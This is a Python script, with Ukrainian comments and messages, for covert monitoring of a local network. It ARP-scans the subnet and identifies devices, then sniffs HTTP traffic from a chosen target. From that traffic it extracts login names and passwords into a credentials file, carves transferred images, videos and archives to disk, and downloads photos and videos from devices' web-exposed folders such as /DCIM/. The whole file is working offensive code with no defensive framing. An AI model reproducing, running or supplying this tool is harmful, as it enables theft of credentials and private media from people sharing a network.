from scapy.all import sniff, TCP, Raw, IP, ARP, Ether, srp
from datetime import datetime
import re
import os
import zipfile
import subprocess
import requests

FILE_EXTS = ["jpg", "jpeg", "png", "gif", "bmp", "mp4", "avi", "mov", "mkv", "webm"]
FILENAME_RE = re.compile(
    r'Content-Disposition:.*filename=[\"\' ]?([^\"\'\s]+\.(' + "|".join(FILE_EXTS) + r'))',
    re.IGNORECASE
)
USERNAME_RE = re.compile(r'username=([^&\s]*)')
PASSWORD_RE = re.compile(r'password=([^&\s]*)')

MATERIALS_DIR = os.path.join(os.getcwd(), "матеріли")
os.makedirs(MATERIALS_DIR, exist_ok=True)

def save_file(files_dir, filename, data):
    path = os.path.join(MATERIALS_DIR, filename)
    with open(path, "wb") as f:
        f.write(data)
    print(f"[+] Файл збережено: {path}")

def extract_and_save_file(files_dir, filename, data):
    # Створюємо папку для розпакованих файлів у "матеріли"
    extracted_dir = os.path.join(MATERIALS_DIR, "extracted")
    os.makedirs(extracted_dir, exist_ok=True)
    # Зберігаємо оригінальний файл
    save_file(files_dir, filename, data)
    # Якщо це zip-архів, розпаковуємо
    if filename.lower().endswith(".zip"):
        try:
            zip_path = os.path.join(MATERIALS_DIR, filename)
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)
            print(f"[+] Zip-архів розпаковано у: {extracted_dir}")
        except Exception as e:
            print(f"[!] Помилка при розпакуванні zip: {e}")
    # Якщо це rar-архів, залишаємо коментар
    elif filename.lower().endswith(".rar"):
        print("[!] Для розпакування rar потрібен модуль rarfile та встановлений unrar.")
        # import rarfile
        # rf = rarfile.RarFile(os.path.join(MATERIALS_DIR, filename))
        # rf.extractall(extracted_dir)

def extract_files_from_http(files_dir, payload):
    try:
        decoded = payload.decode(errors='ignore')
    except Exception:
        return
    for match in FILENAME_RE.findall(decoded):
        filename = match[0]
        file_data = payload.split(b"\r\n\r\n")[-1]
        extract_and_save_file(files_dir, filename, file_data)

def parse_http_payload(output_dir, payload):
    username_match = USERNAME_RE.search(payload)
    password_match = PASSWORD_RE.search(payload)
    if username_match or password_match:
        print("\n[!] Можливі дані для входу:")
        if username_match:
            print(f"   Логін: {username_match.group(1)}")
        if password_match:
            print(f"   Пароль: {password_match.group(1)}")
        print("-" * 50)
        with open(f"{output_dir}/http_credentials.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {payload}\n")

# Простий OUI-lookup для популярних брендів (можна розширити)
OUI_PREFIXES = {
    "Apple": ["00:1C:B3", "F0:99:BF", "A4:5E:60", "3C:07:54", "D0:03:4B", "28:37:37"],
    "Samsung": ["F4:09:D8", "00:16:6C", "5C:49:79", "B8:57:D8"],
    "Xiaomi": ["64:09:80", "28:6C:07", "50:64:2B"],
    "Huawei": ["00:9A:CD", "F4:8B:32", "C8:D1:5E"],
    "TP-Link": ["50:3E:AA", "F4:F2:6D", "B0:BE:76"],
    "Cisco": ["00:1B:54", "00:23:04", "00:25:9C"],
    "ASUS": ["60:A4:4C", "D8:50:E6", "C8:60:00"],
    "Sony": ["00:13:15", "00:1E:3D", "00:23:06"],
    "Lenovo": ["00:26:9E", "28:3A:4D", "F0:76:1C"],
    "Microsoft": ["00:50:F2", "00:1D:D8"],
    # ...можна додати ще
}

def get_oui_brand(mac):
    mac = mac.upper()
    for brand, prefixes in OUI_PREFIXES.items():
        for prefix in prefixes:
            if mac.startswith(prefix):
                if brand == "Apple":
                    return "Apple iPhone/iPad"
                return brand
    # Якщо не знайдено у локальному словнику — пробуємо онлайн OUI lookup
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
        if response.status_code == 200:
            vendor = response.text.strip()
            if vendor:
                return vendor
    except Exception:
        pass
    return "Невідомий пристрій"

def get_netbios_name(ip):
    try:
        result = subprocess.run(["nbtscan", "-v", "-s", ",", ip], capture_output=True, text=True, timeout=2)
        lines = result.stdout.splitlines()
        for line in lines:
            if "<00>" in line and "UNIQUE" in line:
                parts = line.split()
                if len(parts) > 0:
                    return parts[0].strip()
    except Exception:
        pass
    return None

def get_device_name(mac, ip):
    netbios = get_netbios_name(ip)
    if netbios:
        return netbios
    brand = get_oui_brand(mac)
    if brand:
        return brand
    return "Невідомий пристрій"

def scan_network(ip_range="192.168.1.0/24"):
    print(f"[*] Сканування мережі {ip_range}...")
    devices = []
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=0)
        for snd, rcv in ans:
            name = get_device_name(rcv.hwsrc, rcv.psrc)
            devices.append({
                "ip": rcv.psrc,
                "mac": rcv.hwsrc,
                "name": name
            })
    except Exception as e:
        print(f"[!] Помилка сканування мережі: {e}")
    return devices

def choose_device(devices):
    print("\nЗнайдені пристрої у мережі:")
    for idx, dev in enumerate(devices):
        print(f"{idx+1}. {dev['name']} | IP: {dev['ip']}  MAC: {dev['mac']}")
    if not devices:
        print("Не знайдено пристроїв.")
        return None
    try:
        choice = int(input("Оберіть номер пристрою для моніторингу (0 - всі): "))
        if choice == 0:
            return None
        if 1 <= choice <= len(devices):
            return devices[choice-1]['ip']
    except Exception:
        pass
    return None

def http_sniffer(output_dir, files_dir, filter_ip=None):
    def http_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                payload = packet[Raw].load
                try:
                    decoded_payload = payload.decode('utf-8', errors='ignore')
                except Exception:
                    return
                if ("GET /" in decoded_payload or "POST /" in decoded_payload) and packet.haslayer(IP):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    if filter_ip and src_ip != filter_ip and dst_ip != filter_ip:
                        return
                    print(f"\n[HTTP] {src_ip} -> {dst_ip}")
                    print("-" * 30)
                    headers = decoded_payload.split('\r\n\r\n')[0]
                    print(headers)
                    parse_http_payload(output_dir, decoded_payload)
                    with open(f"{output_dir}/http_log.txt", "a", encoding="utf-8") as f:
                        f.write(f"{datetime.now()}: {decoded_payload[:200]}...\n")
                if b"HTTP/1." in payload:
                    extract_files_from_http(files_dir, payload)
            except Exception:
                pass
    print("[*] Запуск HTTP-сниффера (логіни/паролі + файли)...")
    sniff(filter="tcp port 80 or tcp port 8080", prn=http_callback, store=0)

def download_media_from_device(ip, ports=[80, 8080], paths=None):
    if paths is None:
        paths = [
            "/DCIM/", "/media/", "/photos/", "/videos/", "/photo/", "/video/", "/images/", "/gallery/"
        ]
    exts = tuple("." + ext for ext in FILE_EXTS)
    for port in ports:
        for base_path in paths:
            url = f"http://{ip}:{port}{base_path}"
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code == 200 and ("<a href=" in resp.text or "<img" in resp.text):
                
                    links = re.findall(r'href=[\'"]?([^\'" >]+)', resp.text)
                    for link in links:
                        if link.lower().endswith(exts):
                            file_url = url + link if not link.startswith("http") else link
                            try:
                                file_resp = requests.get(file_url, timeout=5)
                                if file_resp.status_code == 200:
                                    filename = os.path.basename(link)
                                    save_file(None, filename, file_resp.content)
                                    print(f"[+] Завантажено файл з {ip}: {filename}")
                            except Exception as e:
                                print(f"[!] Помилка завантаження {file_url}: {e}")
            except Exception:
                continue


